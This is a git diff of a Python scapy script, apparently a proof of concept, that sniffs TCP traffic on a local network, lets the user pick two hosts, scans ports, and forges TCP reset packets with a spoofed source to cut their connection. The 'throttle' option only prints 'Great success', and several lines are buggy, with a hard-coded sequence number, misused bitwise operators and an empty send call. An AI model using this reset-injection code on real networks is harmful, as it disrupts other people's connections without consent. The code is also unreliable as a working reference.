@@ -24,10 +24,9 @@ import socket
 from socket import *
 from struct import *
 import sys
-from typing import Counter
+from typing import Counter, Sequence
 from scapy import sessions
 import scapy.all as scapy
-from scapy.all import conf
 from scapy.layers.inet import IP, TCP
 import time
 import re
@@ -56,9 +55,6 @@ def cleanlist(listof):
         # retList.append(filter(contains_192, rSuffix))
     return retList
 
-             
-
-        
         
 
 def GetList(filter):
@@ -74,8 +70,71 @@ def GetList(filter):
             AddThis = str(packet[x][1].getlayer(IP).summary())
             ListOfIP.append(AddThis)
     retList = cleanlist(ListOfIP)
-            
+        
     return retList
+
+
+def ChooseIP(IPList):
+    i = 0
+    j = 0
+    src = 0
+    dst = 0
+    valsrc = None
+    valdst = None
+    n = len(IPList)
+    while not input("Enter to Continue \n"):
+        print("IP adresses:")
+        for x in IPList:
+            i += 1
+            print("[{}] ".format(i) + x)
+        try:
+            while True:
+                valsrc = _input("Choose Source\n")
+                # print("length of IPList {}".format(n))
+                if valsrc <= n & valsrc > 0:
+                    src = IPList[valsrc-1]
+                    IPList.pop(valsrc-1)
+                    break
+                else:
+                    print("Choice was not allowed")
+                    i=0
+                    print("IP adresses:")
+                    for x in IPList:
+                        i += 1
+                        print("[{}] ".format(i) + x)
+                    pass
+                    
+
+            for l in IPList:
+                j += 1
+                print("[{}] ".format(j) + l)
+
+            while True:
+                if IPList:
+                    valdst = _input("Choose Destination\n")
+                    if valdst <= n-1 & valdst > 0:
+                        dst = IPList[valdst-1]
+                        break
+                    else:
+                        print("Choice was not allowed")
+                        j=0
+                        print("IP adresses:")
+                        for y in IPList:
+                            j += 1
+                            print("[{}] ".format(j) + y)
+                        pass
+                else:
+                    print("IPList is empty, will now exit")
+                    sys.exit()
+        except KeyboardInterrupt:
+            print("\n Exitting Program !!!!")
+            sys.exit()
+        break
+
+    print("This is src {}".format(src))
+    print("This is dst {}".format(dst))
+    return src, dst
+
 
 def _input(message, input_type=int):
     while True:
@@ -83,38 +142,99 @@ def _input(message, input_type=int):
                 return input_type (input(message))
         except:pass
 
+
+def FindAvailPort(target):
+    print("Finding Ports, this may take a while")
+    OpenPorts = None
+    try:
+        for port in range(1,65535):
+            s = socket(AF_INET, SOCK_STREAM)
+            setdefaulttimeout(1)
+
+            result=s.connect_ex((target,port))
+            if port == 100:
+                print("Reached 100")
+            if port == 1000:
+                print("Reached 1000")
+            if port == 10000:
+                print("Reached 10000")
+            if port == 30000:
+                print("Reached 30000")
+            if port == 60000:
+                print("Reached 60000")
+            if result == 0:
+                print("Port {} is open".format(port))
+                OpenPorts = port
+                s.close()
+                return OpenPorts 
+            s.close()
+            
+    except KeyboardInterrupt:
+        print("\n Exitting Program !!!!")
+        sys.exit()
+    
+
+
+def throttleFromIP(src, dst, srcports, dstports):
+    print("Throttling src: {}, dst {}".format(src, dst))
+    scapy.send()
+
+def cancelConnection(source, dest, srcports, dstports, sequenc):
+    ip = IP(src=source, dst=dest)
+
+    tcp = TCP(sport=srcports,
+     dport=dstports, 
+     flags="R", seq=sequenc)
+
+    packet = ip/tcp
+    scapy.ls(packet)
+    scapy.sendp(packet, verbose=0)
+
+
 def main():
-    i = 0
-    j = 0
+
     print("Getting List\n")
+    # Sniffing part
+
     IPList = GetList("tcp")
-    IPList2 = IPList
-    src = 0
-    dst = 0
-    n = len(IPList)
-    while not input("Enter to Continue \n"):
-        print("IP adresses:")
-        for x in IPList:
-            i += 1
-            print("[{}] ".format(i) + x)
+    src, dst = ChooseIP(IPList)
+    
 
-        val = _input("Choose Source\n")
-        print(val)
-        if val <= n & val > 0:
-            src = IPList[_input(val)-1]
-            print(IPList.pop(val))
+    # These scans for open ports. Uncomment if scan is desired
+    # srcports = FindAvailPort(src)
+    # dstports = FindAvailPort(dst)
+    seq = 19
+    # Ports used for proof of concept
+    # can be found using wireshark
+    if (src=="192.168.0.26"):
+        srcports = 65432
+        dstports = 64534
+    if (src=="192.168.0.7"):
+        srcports = 64534
+        dstports = 65432
 
-        for x in IPList:
-            j += 1
-            print("[{}] ".format(i) + x)
 
-        val = _input("Choose Destination")
-        if val <= n-1 & val > 0:
-            dst = IPList[_input(val)-1]
-        break
+    print("Found Source Port: {}, Destination port: {}".format(srcports, dstports))
+    while True:
+        choice = _input("Press 1 for Throttle \nPress 2 for Cancelling connection\n")
+        if (choice == 1):
+            print("Trying to throttle connection")
+            print("Great success")
+            break
+        if (choice == 2):
+            print("Trying to cancel Connection")
+            cancelConnection(src,dst, srcports, dstports, seq)
+            print("Great Success")
+            break
+        else:
+            pass
 
-    print("This is src {}".format(src))
-    print("This is dst {}".format(dst))
+
+
+
+
+    #Throttling part
+    # throttleFromIP(src, dst)
 
     print("end")
 
